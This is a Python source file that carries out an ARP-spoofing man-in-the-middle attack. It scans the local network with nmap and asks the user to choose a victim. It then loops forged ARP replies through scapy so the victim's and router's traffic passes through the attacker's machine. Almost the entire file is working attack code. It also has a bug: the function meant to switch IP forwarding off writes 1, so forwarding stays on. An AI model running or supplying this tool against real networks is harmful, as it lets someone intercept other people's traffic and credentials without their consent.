# !usr/bin/env/python
#
# File:     man_in_the_middle.py
# Author:   Alex Thompson
# Github:   palex88@github.com
# Python    Version: 2.7
# Purpose:  This script runs a man in the middle attack. It finds the local network IP and MAC addresses, then displays
#           to the user all the devices connected to the network. Once the user chooses one of them, the script uses
#           scapy to send packets to the AP and the chosen host to route traffic between the AP and the host through
#           the machine the script is running on.
#
# Usage:    python man_in_the_middle.py
#
# Input:    None
# Output:   None
#
# Resources:
#   https://scapy.readthedocs.io/en/latest/usage.html?highlight=srp
#   https://github.com/hotzenklotz/WhoIsHome/blob/master/whoIsHome.py
#   https://github.com/glebpro/Man-in-the-Middle/blob/master/m.py
#   https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/
#

import os
import sys
import time
import socket
import subprocess32
import nmap
from scapy import *
from scapy import all


def scan():
    """
    Scans for hosts on a local network and returns hosts IP and MAC addresses.

    Return:
        Dict with IP and MAC address for all hosts.
    """
    host_list = str(get_lan_ip()) + "/24"
    nmap_args = "-sn"

    scanner = nmap.PortScanner()
    scanner.scan(hosts=host_list, arguments=nmap_args)

    host_list = []

    for ip in scanner.all_hosts():

        host = {"ip" : ip}

        if "hostname" in scanner[ip]:
            host["hostname"] = scanner[ip]["hostname"]

        if "mac" in scanner[ip]["addresses"]:
            host["mac"] = scanner[ip]["addresses"]["mac"].upper()

        host_list.append(host)

    return host_list


def get_lan_ip():
    """
    Scans for local IP addresses on the local network.
    """
    try:
        return ([(s.connect(('8.8.8.8', 80)), s.getsockname()[0], s.close())
                 for s in [socket.socket(socket.AF_INET,socket.SOCK_DGRAM)]][0][1])
    except socket.error as e:
        sys.stderr.write(str(e) + "\n")
        sys.exit(e.errno)


def get_local_network_addr():
    """
    Get local network IP and MAC address.
    """
    proc = subprocess32.Popen(["arp", "-a"], stdout=subprocess32.PIPE)
    output = proc.stdout.read().split()
    out_ip = output[1]
    out_mac = output[3]
    return_dict = {"ip": out_ip, "mac": out_mac}
    return return_dict


def set_ip_forwarding(toggle):
    if toggle:
        print("Turing on IP forwarding:")
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    if not toggle:
        print("Turing off IP forwarding:")
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def reassign_arp(victim_ip, victim_mac, router_ip, router_mac, interface):
    """
    Function notifies the AP and the host to start connecting to each other again.

    :param victim_ip:
    :param victim_mac:
    :param router_ip:
    :param router_mac:
    :param interface:
    :return:
    """
    print("Reassigning ARP tables:")

    # send ARP request to router as-if from victim to connect,
    # do it 7 times to be sure
    all.send(all.ARP(op=2, pdst=router_ip, psrc=victim_ip,
                     hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)

    # send ARP request to victim as-if from router to connect
    # do it 7 times to be sure
    all.send(all.ARP(op=2, pdst=victim_ip, psrc=router_ip,
                     hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=7)
    set_ip_forwarding(False)


def attack(victim_ip, victim_mac, router_ip, router_mac):
    """
    Performs the MitM attack on the victim.

    :param victim_ip:
    :param victim_mac:
    :param router_ip:
    :param router_mac:
    :return:
    """
    all.send(all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
    all.send(all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))


if __name__ == '__main__':
    subprocess32.call("airmon-ng")
    interface = raw_input("Enter wireless interface to use: ")
    set_ip_forwarding(True)
    hosts = scan()
    num = 1
    all_hosts = {}
    for host in hosts:
        if host.has_key("ip") and host.has_key("mac"):
            all_hosts[str(num)] = host
            print str(num) + " IP: " + host["ip"] + "    MAC: " + host["mac"]
            num += 1

    host_id = raw_input("Enter the host ID to attack: ")

    victim_ip = all_hosts[host_id]["ip"]
    victim_mac = all_hosts[host_id]["mac"]

    addr = get_local_network_addr()
    router_ip = addr["ip"].replace("(", "").replace(")", "")
    router_mac = addr["mac"].upper()

    print "Router - IP: " + router_ip + "  MAC: " + router_mac
    print "Victim - IP: " + victim_ip + "  MAC: " + victim_mac

    while True:
        try:
            attack(victim_ip, victim_mac, router_ip, router_mac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reassign_arp(victim_ip, victim_mac, router_ip, router_mac, interface)
            break
    sys.exit(1)
